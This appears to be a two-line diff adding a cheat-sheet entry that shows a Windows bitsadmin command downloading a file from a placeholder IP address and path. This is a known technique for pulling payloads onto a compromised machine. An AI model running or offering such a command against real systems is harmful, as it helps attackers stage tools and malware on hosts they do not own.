@@ -1,0 +1,2 @@
+# Download file via bitsadmin
+bitsadmin /Transfer theJob http://<ip>/<filepath> <outputpath>
